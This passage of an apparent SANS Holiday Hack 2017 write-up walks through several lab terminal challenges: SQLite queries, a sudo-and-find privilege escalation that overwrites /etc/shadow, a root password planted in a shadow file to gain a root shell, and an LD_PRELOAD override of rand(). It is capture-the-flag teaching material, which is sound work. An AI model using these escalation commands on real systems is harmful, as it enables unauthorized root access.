<pre class="example">
elf@784e43534178:~$ sqlite3 christmassongs.db 
SQLite version 3.11.0 2016-02-15 17:29:24
Enter ".help" for usage hints.
sqlite&gt; .mode tabs  
sqlite&gt; .headers on
</pre>

<p>
Now, let's see what we are working with here.
</p>

<div class="org-src-container">
<pre class="src src-sqlite">sqlite&gt; .<span style="color: #b5bd68;">schema</span>
<span style="color: #b5bd68;">CREATE</span> <span style="color: #b5bd68;">TABLE</span> <span style="color: #de935f;">songs</span>(
  id <span style="color: #81a2be;">INTEGER</span> <span style="color: #b5bd68;">PRIMARY</span> <span style="color: #b5bd68;">KEY</span> AUTOINCREMENT,
  title TEXT,
  artist TEXT,
  <span style="color: #b5bd68;">year</span> TEXT,
  notes TEXT
);
<span style="color: #b5bd68;">CREATE</span> <span style="color: #b5bd68;">TABLE</span> <span style="color: #de935f;">likes</span>(
  id <span style="color: #81a2be;">INTEGER</span> <span style="color: #b5bd68;">PRIMARY</span> <span style="color: #b5bd68;">KEY</span> AUTOINCREMENT,
  <span style="color: #b5bd68;">like</span> <span style="color: #81a2be;">INTEGER</span>,
  datetime <span style="color: #81a2be;">INTEGER</span>,
  songid <span style="color: #81a2be;">INTEGER</span>,
  <span style="color: #b5bd68;">FOREIGN</span> <span style="color: #b5bd68;">KEY</span>(songid) <span style="color: #b5bd68;">REFERENCES</span> songs(id)
);
</pre>
</div>

<p>
As a sanity check, let's see what one record of each looks like.
</p>

<div class="org-src-container">
<pre class="src src-sqlite">sqlite&gt; <span style="color: #b5bd68;">select</span> * <span style="color: #b5bd68;">from</span> songs <span style="color: #b5bd68;">limit</span> 1;
</pre>
</div>
<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-right" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-right" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-right">id</th>
<th scope="col" class="org-left">title</th>
<th scope="col" class="org-left">artist</th>
<th scope="col" class="org-right">year</th>
<th scope="col" class="org-left">notes</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-right">1</td>
<td class="org-left">A' Soalin'</td>
<td class="org-left">Peter, Paul &amp; Mary</td>
<td class="org-right">1963</td>
<td class="org-left">From the album Moving. Written by Paul Stookey, Tracy Batteste &amp; Elaina Mezzetti.</td>
</tr>
</tbody>
</table>

<div class="org-src-container">
<pre class="src src-sqlite">sqlite&gt; <span style="color: #b5bd68;">select</span> * <span style="color: #b5bd68;">from</span> likes <span style="color: #b5bd68;">limit</span> 1;
</pre>
</div>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-right" />

<col  class="org-right" />

<col  class="org-right" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-right">id</th>
<th scope="col" class="org-right">like</th>
<th scope="col" class="org-right">datetime</th>
<th scope="col" class="org-right">songid</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-right">1</td>
<td class="org-right">1</td>
<td class="org-right">1487102189</td>
<td class="org-right">250</td>
</tr>
</tbody>
</table>

<p>
Two tables, "songs", and "likes".  <code>likes.songid</code> matches up with <code>songs.id</code>.
This means we can join the two tables together on <code>songs.id=likes.songid</code>.  Once that
is done, the solution requires the count of likes grouped by title:
</p>

<div class="org-src-container">
<pre class="src src-sqlite">sqlite&gt; <span style="color: #b5bd68;">select</span> title, <span style="color: #b294bb;">count</span>(*) <span style="color: #b5bd68;">from</span> songs, likes <span style="color: #b5bd68;">where</span> songs.id=likes.songid <span style="color: #b5bd68;">group</span> <span style="color: #b5bd68;">by</span> title <span style="color: #b5bd68;">order</span> <span style="color: #b5bd68;">by</span> <span style="color: #b294bb;">count</span>(*) <span style="color: #b5bd68;">desc</span> <span style="color: #b5bd68;">limit</span> 3;
</pre>
</div>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">title</th>
<th scope="col" class="org-right">count(*)</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Stairway to Heaven</td>
<td class="org-right">11325</td>
</tr>

<tr>
<td class="org-left">Joy to the World</td>
<td class="org-right">2162</td>
</tr>

<tr>
<td class="org-left">The Little Boy that Santa Claus Forgot</td>
<td class="org-right">2140</td>
</tr>
</tbody>
</table>
</div>
</div>

<div id="outline-container-org74dad28" class="outline-4">
<h4 id="kansas_solution"><a id="org74dad28"></a>Solution</h4>
<div class="outline-text-4" id="text-kansas_solution">
<p>
A one-liner is:
</p>

<pre class="example">
elf@784e43534178:~$ sqlite3 christmassongs.db "select title from songs, likes where songs.id=likes.songid group by title order by count(*) desc limit 1;"
Stairway to Heaven
</pre>
</div>
</div>

<div id="outline-container-org4cb8897" class="outline-4">
<h4 id="kansas_alternatives"><a id="org4cb8897"></a>Alternatives</h4>
<div class="outline-text-4" id="text-kansas_alternatives">
<p>
Instead of joining the tables, we can first find what the most popular songid is:
</p>

<div class="org-src-container">
<pre class="src src-sqlite">sqlite&gt; <span style="color: #b5bd68;">select</span> songid, <span style="color: #b294bb;">count</span>(*) <span style="color: #b5bd68;">from</span> likes <span style="color: #b5bd68;">group</span> <span style="color: #b5bd68;">by</span> songid <span style="color: #b5bd68;">order</span> <span style="color: #b5bd68;">by</span> <span style="color: #b294bb;">count</span>(*) <span style="color: #b5bd68;">desc</span> <span style="color: #b5bd68;">limit</span> 3;
</pre>
</div>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-right" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-right">songid</th>
<th scope="col" class="org-right">count(*)</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-right">392</td>
<td class="org-right">11325</td>
</tr>

<tr>
<td class="org-right">245</td>
<td class="org-right">2162</td>
</tr>

<tr>
<td class="org-right">265</td>
<td class="org-right">2140</td>
</tr>
</tbody>
</table>


<p>
and then look up what the title for that song is
</p>

<div class="org-src-container">
<pre class="src src-sqlite">sqlite&gt; <span style="color: #b5bd68;">select</span> title <span style="color: #b5bd68;">from</span> songs <span style="color: #b5bd68;">where</span> id=392;
</pre>
</div>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">title</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Stairway to Heaven</td>
</tr>
</tbody>
</table>

<p>
This can also be done in a single query as long as we don't care about the like count:
</p>

<div class="org-src-container">
<pre class="src src-sqlite">sqlite&gt; <span style="color: #b5bd68;">select</span> title <span style="color: #b5bd68;">from</span> songs <span style="color: #b5bd68;">where</span> id = (<span style="color: #b5bd68;">select</span> songid <span style="color: #b5bd68;">from</span> likes <span style="color: #b5bd68;">group</span> <span style="color: #b5bd68;">by</span> songid <span style="color: #b5bd68;">order</span> <span style="color: #b5bd68;">by</span> <span style="color: #b294bb;">count</span>(*) <span style="color: #b5bd68;">desc</span> <span style="color: #b5bd68;">limit</span> 1);
</pre>
</div>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />
</colgroup>
<tbody>
<tr>
<td class="org-left">Stairway to Heaven</td>
</tr>
</tbody>
</table>

<p>
This method even outperforms the join, taking about half the time to run!  This
is because the join has to examine all of the song titles, but the subquery
method only has to look at one.
</p>
</div>
</div>
</div>
<div id="outline-container-orgb7097c9" class="outline-3">
<h3 id="orgb7097c9">Oh Wait Maybe We Are</h3>
<div class="outline-text-3" id="text-orgb7097c9">
</div>
<div id="outline-container-orgd9ec6d2" class="outline-4">
<h4 id="we_are_question"><a id="orgd9ec6d2"></a>Question</h4>
<div class="outline-text-4" id="text-we_are_question">
<pre class="example">
            --&gt;*&lt;--
              /o\
             /_\_\
            /_/_0_\
           /_o_\_\_\
          /_/_/_/_/o\
         /@\_\_\@\_\_\
        /_/_/O/_/_/_/_\
       /_\_\_\_\_\o\_\_\
      /_/0/_/_/_0_/_/@/_\
     /_\_\_\_\_\_\_\_\_\_\
    /_/o/_/_/@/_/_/o/_/0/_\
   jgs       [___]  


My name is Shinny Upatree, and I've made a big mistake.
I fear it's worse than the time I served everyone bad hake.
I've deleted an important file, which suppressed my server access.
I can offer you a gift, if you can fix my ill-fated redress.

Restore /etc/shadow with the contents of /etc/shadow.bak, then run "inspect_da_box" to complete this challenge.
Hint: What commands can you run with sudo?
</pre>
</div>
</div>

<div id="outline-container-orgd29a685" class="outline-4">
<h4 id="we_are_how-to-find-the-terminal"><a id="orgd29a685"></a>How to find the terminal</h4>
<div class="outline-text-4" id="text-we_are_how-to-find-the-terminal">
<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/f09180b7-43e4-406c-83ac-924539e7b8f5">https://2017.holidayhackchallenge.com/game/f09180b7-43e4-406c-83ac-924539e7b8f5</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&amp;uid=USER_ID</a>
</p>

<div class="org-center">
<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/kVKmTwQ7nNg?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div>


<div class="figure">
<p><img src="./images/terminal-location-we_are.png" alt="terminal-location-we_are.png" />
</p>
<p><span class="figure-number">Figure 11: </span>The terminal is just behind the starting ramp on the main platform.</p>
</div>
</div>
</div>

<div id="outline-container-org9a60199" class="outline-4">
<h4 id="we_are_background-information"><a id="org9a60199"></a>Background Information</h4>
<div class="outline-text-4" id="text-we_are_background-information">
<p>
We're logged in as the user <code>elf</code>. We happen to know that
<code>/etc/shadow</code> is where *NIX systems store the password hashes for
their users.
</p>

<p>
The system <abbr title="Message of the Day"> MOTD</abbr> gives us a hint:
</p>

<blockquote>
<p>
What commands can you run with sudo?
</p>
</blockquote>

<p>
We also know that <code>sudo</code> is a program that allows us to run commands with the privileges of other users and/or groups.
</p>
</div>
</div>

<div id="outline-container-org0cb7549" class="outline-4">
<h4 id="we_are_goal"><a id="org0cb7549"></a>Goal</h4>
<div class="outline-text-4" id="text-we_are_goal">
<p>
We need to overwrite /etc/shadow with /etc/shadow.bak. Basically we
need to <code>cp /etc/shadow.bak /etc/shadow</code>, except that we don't have
permissions to do that directly:
</p>

<pre class="example">
elf@784e43534178:~$ cp /etc/shadow.bak /etc/shadow
cp: cannot create regular file '/etc/shadow': Permission denied
</pre>
</div>
</div>

<div id="outline-container-org6c4a280" class="outline-4">
<h4 id="we_are_approach"><a id="org6c4a280"></a>Hints</h4>
<div class="outline-text-4" id="text-we_are_approach">
<p>
Shinny Upatree on Twitter has a few hints:
</p>

<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">I think I have some pseudo (sp?) permissions on this Unix server, but I don&#39;t know what that means. <a href="https://twitter.com/GreenesterElf?ref_src=twsrc%5Etfw">@GreenesterElf</a> said this was a &quot;learning opportunity&quot; and won&#39;t give me the answer :&#39;(</p>&mdash; Shinny Upatree (@ClimbALLdaTrees) <a href="https://twitter.com/ClimbALLdaTrees/status/938578359860174848?ref_src=twsrc%5Etfw">December 7, 2017</a></blockquote>
</div>
</div>

<div id="outline-container-orge4afb84" class="outline-4">
<h4 id="we_are_approach"><a id="orge4afb84"></a>Approach</h4>
<div class="outline-text-4" id="text-we_are_approach">
<p>
If we follow the hint, we should try to figure out what commands we can run with sudo. Let's run <code>sudo -h</code> to view the help documentation:
</p>

<pre class="example">
sudo - execute a command as another user
...
  -l, --list                  list user's privileges or check a specific command; use twice for longer format
...
</pre>

<p>
To follow the hint, we should run sudo with the <code>--list</code> option, to see what our privileges are:
</p>

<pre class="example">
elf@784e43534178:~$ sudo --list
Matching Defaults entries for elf on 784e43534178:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elf may run the following commands on 784e43534178:
    (elf : shadow) NOPASSWD: /usr/bin/find
</pre>

<p>
We can run the find command, but it also mentions something about shadow. Let's give it a shot:
</p>

<pre class="example">
elf@784e43534178:~$ sudo find
[sudo] password for elf: 
</pre>

<p>
We don't know the password. The sudo output said we should be able to
run this without a password ("NOPASSWD"). Something's not quite
right. We can run sudo with <code>-l -l</code> as the help output said to get
some more verbose output:
</p>

<pre class="example">
elf@784e43534178:~$ sudo -l -l
Matching Defaults entries for elf on 784e43534178:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elf may run the following commands on 784e43534178:
Sudoers entry:
    RunAsUsers: elf
    RunAsGroups: shadow
    Options: !authenticate
    Commands:
	/usr/bin/find
</pre>

<p>
Ok. So sudo lets us run the find command as the user elf, and the group shadow. Viewing <code>sudo -h</code> one more time shows us that there's an option we want to set our group to <code>shadow</code>:
</p>
<pre class="example">
-g, --group=group           run command as the specified group name or ID
</pre>

<pre class="example">
elf@784e43534178:~$ sudo -g shadow find 
.
./.bashrc
./.bash_logout
./.profile
</pre>

<p>
This time, sudo let us run find without prompting us for a
password. So, we know that we can run commands as the elf user, and
the shadow group. Is this enough to overwrite <code>/etc/shadow</code>?
</p>

<pre class="example">
elf@784e43534178:~$ ls -l /etc/shadow
-rw-rw---- 1 root shadow 0 Dec 15 20:00 /etc/shadow
</pre>

<p>
Yes. <code>/etc/shadow</code> is owned by the root user and the shadow group, and
the group has write permissions to it. At this point, the only thing
that's left is figuring out how to use <code>find</code> in order to copy
<code>/etc/shadow.bak</code> to <code>/etc/shadow</code>. <code>find</code> has an exec option:
</p>

<pre class="example">
actions: -delete -print0 -printf FORMAT -fprintf FILE FORMAT -print 
      -fprint0 FILE -fprint FILE -ls -fls FILE -prune -quit
      -exec COMMAND ; -exec COMMAND {} + -ok COMMAND ;
      -execdir COMMAND ; -execdir COMMAND {} + -okdir COMMAND ;
</pre>

<p>
Let's give it a shot:
</p>
<pre class="example">
elf@784e43534178:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow \;
</pre>

<p>
Looks like that worked:
</p>

<pre class="example">
elf@784e43534178:~$ inspect_da_box 
		     ___
		    / __'.     .-"""-.
	      .-""-| |  '.'.  / .---. \
	     / .--. \ \___\ \/ /____| |
	    / /    \ `-.-;-(`_)_____.-'._
	   ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
	   | |      /       \ /      `\ `. \       / .-. \
	   \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
		  `._       _.'|         .'
		     ```````    '-...--'`
/etc/shadow has been successfully restored!
</pre>
</div>
</div>

<div id="outline-container-org3868a3f" class="outline-4">
<h4 id="we_are_solution"><a id="org3868a3f"></a>Solution</h4>
<div class="outline-text-4" id="text-we_are_solution">
<p>
A one-liner is:
</p>

<pre class="example">
sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow \; &amp;&amp; inspect_da_box
</pre>
</div>
</div>

<div id="outline-container-orge25ab3b" class="outline-4">
<h4 id="we_are_alternatives"><a id="orge25ab3b"></a>Alternatives</h4>
<div class="outline-text-4" id="text-we_are_alternatives">
<p>
Instead of using <code>find</code> to directly copy the file, we can just use it to start an elevated shell:
</p>

<pre class="example">
elf@784e43534178:~$ id
uid=1000(elf) gid=1000(elf) groups=1000(elf)
elf@784e43534178:~$ sudo -g shadow find -exec bash \;
...
elf@784e43534178:~$ id
uid=1000(elf) gid=42(shadow) groups=42(shadow),1000(elf)
</pre>

<p>
This shows how we can use <code>sudo</code> and <code>find</code> as a general privilege escalation mechanism.
</p>

<p>
Another way of doing this is by putting in a modified shadow file instead, which will have a password that we know for the root user.
</p>

<p>
First, let's generate the password hash in the right format:
</p>

<pre class="example">
elf@784e43534178:~$ echo "password" | openssl passwd -1 -stdin
$1$wDLzsvsW$0.aZ24yCO8xhhjnfHUIG3/
</pre>

<p>
Now that we have a hash, we'll use sed to modify the <code>/etc/shadow.bak</code>
file to have that for root's password. Remember to be careful in
escaping special characters in the sed command line.
</p>

<pre class="example">
elf@784e43534178:~$ sed -e 's/root:\*/root:$1$wDLzsvsW$0.aZ24yCO8xhhjnfHUIG3/' /etc/shadow.bak | tee better.shadow
root:$1$WPvxfOOK$JqDBD/DPQlpkUBOC3qTp51:17484:0:99999:7:::
daemon:*:17484:0:99999:7:::
bin:*:17484:0:99999:7:::
sys:*:17484:0:99999:7:::
sync:*:17484:0:99999:7:::
games:*:17484:0:99999:7:::
...
</pre>

<p>
Now, we re-run our find command, and find that we can escalate to root with a password of <code>password</code>:
</p>

<pre class="example">
elf@784e43534178:~$ sudo -g shadow find -exec cp better.shadow /etc/shadow \;
elf@784e43534178:~$ su
Password: 
root@784e43534178:/home/elf# id  
uid=0(root) gid=0(root) groups=0(root)
</pre>
</div>
</div>

<div id="outline-container-org5710ff0" class="outline-4">
<h4 id="we_are_common-pitfalls"><a id="org5710ff0"></a>Common Pitfalls</h4>
<div class="outline-text-4" id="text-we_are_common-pitfalls">
<p>
<code>find</code>'s exec syntax is a little weird, and a common mistake is forgetting to escape the semicolon at the end:
</p>

<pre class="example">
elf@784e43534178:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow ;
find: missing argument to `-exec'
</pre>

<p>
Another issue is just the fact that sudo is often set up for user
permissions, and not group permissions, so the <code>-g</code> flag is less well
known.
</p>
</div>
</div>
</div>
<div id="outline-container-org3796072" class="outline-3">
<h3 id="org3796072">We're Off To See The</h3>
<div class="outline-text-3" id="text-org3796072">
</div>
<div id="outline-container-org7704be1" class="outline-4">
<h4 id="off_question"><a id="org7704be1"></a>Question</h4>
<div class="outline-text-4" id="text-off_question">
<pre class="example">

                 .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
               _(_      _Y_      _Y_      _Y_      _Y_      _)_
              [___]    [___]    [___]    [___]    [___]    [___]
              /:' \    /:' \    /:' \    /:' \    /:' \    /:' \
             |::   |  |::   |  |::   |  |::   |  |::   |  |::   |
             \::.  /  \::.  /  \::.  /  \::.  /  \::.  /  \::.  /
         jgs  \::./    \::./    \::./    \::./    \::./    \::./
               '='      '='      '='      '='      '='      '='


Wunorse Openslae has a special challenge for you.
Run the given binary, make it return 42.
Use the partial source for hints, it is just a clue.
You will need to write your own code, but only a line or two.
</pre>
</div>
</div>

<div id="outline-container-orgbfc001a" class="outline-4">
<h4 id="off_how-to-find-the-terminal"><a id="orgbfc001a"></a>How to find the terminal</h4>
<div class="outline-text-4" id="text-off_how-to-find-the-terminal">
<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/30a9c19a-f931-4367-9922-d20b91314eec">https://2017.holidayhackchallenge.com/game/30a9c19a-f931-4367-9922-d20b91314eec</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=96452ffb-5153-4473-9fe4-f0ff7921308e&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=96452ffb-5153-4473-9fe4-f0ff7921308e&amp;uid=USER_ID</a>
</p>

<div class="org-center">
<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/NaNbpX8H03I?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div>


<div class="figure">
<p><img src="./images/terminal-location-off.png" alt="terminal-location-off.png" />
</p>
<p><span class="figure-number">Figure 12: </span>The terminal is on a peak off to the side.</p>
</div>
</div>
</div>

<div id="outline-container-orge71ddf4" class="outline-4">
<h4 id="off_background-information"><a id="orge71ddf4"></a>Background Information</h4>
<div class="outline-text-4" id="text-off_background-information">
<p>
We are logged in as the user <code>elf</code>.
</p>

<p>
The <abbr title="Message of the Day"> MOTD</abbr> tells us:
</p>

<blockquote>
<p>
Run the given binary, make it return 42.
Use the partial source for hints, it is just a clue.
You will need to write your own code, but only a line or two.
</p>
</blockquote>

<p>
Two files are provided
</p>

<pre class="example">
-rwxr-xr-x 1 root root 84824 Dec 16 16:47 isit42
-rw-r--r-- 1 root root   654 Dec 15 19:59 isit42.c.un
</pre>
</div>
</div>

<div id="outline-container-orgef6b12d" class="outline-4">
<h4 id="off_goal"><a id="orgef6b12d"></a>Goal</h4>
<div class="outline-text-4" id="text-off_goal">
<p>
For this challenge we need to write our own code in order to make the provided binary <code>isit42</code> return 42.
</p>
</div>
</div>

<div id="outline-container-org9e3f449" class="outline-4">
<h4 id="off_hints"><a id="org9e3f449"></a>Hints</h4>
<div class="outline-text-4" id="text-off_hints">
<p>
<a href="https://twitter.com/1Horse1OSSleigh">Wunorse Openslae (that's a stretch) on Twitter actually has no useful hints</a>
</p>

<p>
This blog post, <a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">Go To The Head Of The Class: LD_PRELOAD For The Win</a>, by Jeff McJunkin was useful.
</p>
</div>
</div>

<div id="outline-container-org179bd6c" class="outline-4">
<h4 id="off_approach"><a id="org179bd6c"></a>Approach</h4>
<div class="outline-text-4" id="text-off_approach">
<p>
<a href="https://ncsa.github.io/sans-holiday-hack-2016/#org42386a9">Our team actually did this exact thing last year in order to derandomize <code>wumpus</code>.</a>
</p>

<p>
In this case looking at the source code we can identify the exact code that is being used to randomize the program:
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #81a2be;">int</span> <span style="color: #de935f;">getrand</span>() {
    srand((<span style="color: #81a2be;">unsigned</span> <span style="color: #81a2be;">int</span>)time(<span style="color: #81a2be;">NULL</span>)); 
    printf(<span style="color: #8abeb7;">"Calling rand() to select a random number.\n"</span>);
    <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">The prototype for rand is: int rand(void);</span>
    <span style="color: #b5bd68;">return</span> rand() % 4096; <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">returns a pseudo-random integer between 0 and 4096</span>
}
</pre>
</div>

<p>
If we create our own library file to define <code>rand()</code> we can remove the randomness.
</p>
</div>
</div>

<div id="outline-container-orga1c2686" class="outline-4">
<h4 id="off_solution"><a id="orga1c2686"></a>Solution</h4>
<div class="outline-text-4" id="text-off_solution">
<p>
As mentioned in the hints section above, we can use <a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">Jeff McJunkin's</a> blog post for guidance on how to complete this challenge.
</p>

<p>
First we'll need to create our own library. We can call it 'rand.c'.
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #81a2be;">int</span> <span style="color: #de935f;">rand</span>(<span style="color: #81a2be;">unsigned</span> <span style="color: #81a2be;">int</span> *<span style="color: #f0c674;">seed</span>) {
    <span style="color: #b5bd68;">return</span> 42;
}
</pre>
</div>

<p>
Then we compile it using the suggested flags in the article.
</p>

<pre class="example">
elf@784e43534178:~$ gcc -o rand -ldl -shared -fPIC rand.c
</pre>

<p>
Once compiled we can then use LD_PRELOAD to load our library.
</p>

<pre class="example">
elf@784e43534178:~$ LD_PRELOAD=`pwd`/rand ./isit42
Starting up ... done.
Calling rand() to select a random number.
		 .-. 
		.;;\ ||           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______ 
	       /::::\|/          |       ||  | |  ||       |  |   _   ||  |  | ||       || | _ | ||       ||    _ |
	      /::::'();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||
	    |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_ 
	,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |
	 \,`////""""\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |
	 | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|
	  \/|(_) () (_)|\/ 
	    \   '()'   /            ______    _______  _______  ___      ___      __   __    ___   _______ 
	    _:.______.;_           |    _ |  |       ||   _   ||   |    |   |    |  | |  |  |   | |       |
	  /| | /`\/`\ | |\         |   | ||  |    ___||  |_|  ||   |    |   |    |  |_|  |  |   | |  _____|
	 / | | \_/\_/ | | \        |   |_||_ |   |___ |       ||   |    |   |    |       |  |   | | |_____ 
	/  |o`""""""""`o|  \       |    __  ||    ___||       ||   |___ |   |___ |_     _|  |   | |_____  |
       `.__/     ()     \__.'      |   |  | ||   |___ |   _   ||       ||       |  |   |    |   |  _____| |
       |  | ___      ___ |  |      |___|  |_||_______||__| |__||_______||_______|  |___|    |___| |_______|
       /  \|---|    |---|/  \ 
       |  (|42 | () | DA|)  |       _   ___  _______ 
       \  /;---'    '---;\  /      | | |   ||       |
	`` \ ___ /\ ___ / ``       | |_|   ||____   |
	    `|  |  |  |`           |       | ____|  |
      jgs    |  |  |  |            |___    || ______| ___ 
       _._  |\|\/||\/|/|  _._          |   || |_____ |   |
      / .-\ |~~~~||~~~~| /-. \         |___||_______||___|
      | \__.'    ||    '.__/ |
       `---------''---------` 
Congratulations! You've won, and have successfully completed this challenge.
</pre>
</div>
</div>

<div id="outline-container-orgce876fc" class="outline-4">
<h4 id="off_alternatives"><a id="orgce876fc"></a>Alternatives</h4>
<div class="outline-text-4" id="text-off_alternatives">
<p>
Another option is to just brute force it.  The sample code shows that the program is using
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #b5bd68;">return</span> rand() % 4096; <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">returns a pseudo-random integer between 0 and 4096</span>
</pre>
</div>

<p>
This means we should only need to run the program a few thousand times for the
result to be 42.  However, if we try to run the program too quickly, we notice
we get the same output each time:
</p>

<pre class="example">
elf@784e43534178:~$ ./isit42 &amp; ./isit42 &amp;
[1] 31
[2] 32
elf@784e43534178:~$ Starting up ... Starting up ... done.
Calling rand() to select a random number.
done.
Calling rand() to select a random number.
945 is not 42.
945 is not 42.
[1]-  Exit 177                ./isit42
[2]+  Exit 177                ./isit42
</pre>


<p>
This is because the program uses the current timestamp in seconds as a random
seed. Running the program more than once a second will not help us.
</p>

<p>
If we run this:
</p>
<pre class="example">
elf@784e43534178:~$ while true;do ./isit42 ; done
</pre>

<p>
We will get a different answer ever time, but since the program contains a
sleep(3) that will only run one attempt every 3 seconds instead of one attempt
per second.  To fix this, we can run each attempt in the background using &amp;,
sleeping 1 second between attempts:
</p>


<pre class="example">
elf@784e43534178:~$ while true;do ./isit42 &amp;sleep 1;done
</pre>

<p>
After a short wait, it succeeds:
</p>

<pre class="example">
Calling rand() to select a random number.
[860]   Exit 37                 ./isit42
[865] 1869
Starting up ... 3566 is not 42.
done.
Calling rand() to select a random number.
[861]   Exit 199                ./isit42
[866] 1871
Starting up ...                  .-.
		.;;\ ||           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______
	       /::::\|/          |       ||  | |  ||       |  |   _   ||  |  | ||       || | _ | ||       ||    _ |
	      /::::'();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||
	    |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_
	,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |
	 \,`////""""\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |
	 | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-org1ba92da" class="outline-2">
<h2 id="org1ba92da">Answers</h2>
<div class="outline-text-2" id="text-org1ba92da">
</div>
<div id="outline-container-orgaa66a23" class="outline-3">
<h3 id="orgaa66a23">Game: This Page Fell off a Truck</h3>
<div class="outline-text-3" id="text-orgaa66a23">
</div>
<div id="outline-container-org5f8e2db" class="outline-4">
<h4 id="q1_question"><a id="org5f8e2db"></a>Question</h4>
<div class="outline-text-4" id="text-q1_question">
<p>
Visit the North Pole and Beyond at the Winter Wonder Landing Level to
collect the first page of The Great Book using a giant snowball. What
is the title of that page?
</p>
</div>
</div>

<div id="outline-container-org1602388" class="outline-4">
<h4 id="q2_solution"><a id="org1602388"></a>Solution</h4>
<div class="outline-text-4" id="text-q2_solution">
<p>
This question simply requires playing the <a href="https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54">Winter Wonder Landing</a> game
level, and redirecting the snowball to collect the <a href="https://www.holidayhackchallenge.com/2017/pages/6dda7650725302f59ea42047206bd4ee5f928d19/GreatBookPage1.pdf">first Great Book page, GreatBookPage1.pdf</a>.
</p>

<p>
This challenge was primarily to get players introduced to the game aspect of the Holiday Hack.
</p>
</div>
</div>
</div>
<div id="outline-container-orgebef2d2" class="outline-3">
<h3 id="orgebef2d2">L2S: Letters to Santa</h3>
<div class="outline-text-3" id="text-orgebef2d2">
</div>
<div id="outline-container-orgfc41e91" class="outline-4">
<h4 id="q2_question"><a id="orgfc41e91"></a>Question</h4>
<div class="outline-text-4" id="text-q2_question">
<p>
Investigate the Letters to Santa application at
<a href="https://l2s.northpolechristmastown.com/">https://l2s.northpolechristmastown.com/</a>. What is the topic of The
Great Book page available in the web root of the server? What is
Alabaster Snowball's password?
</p>

<p>
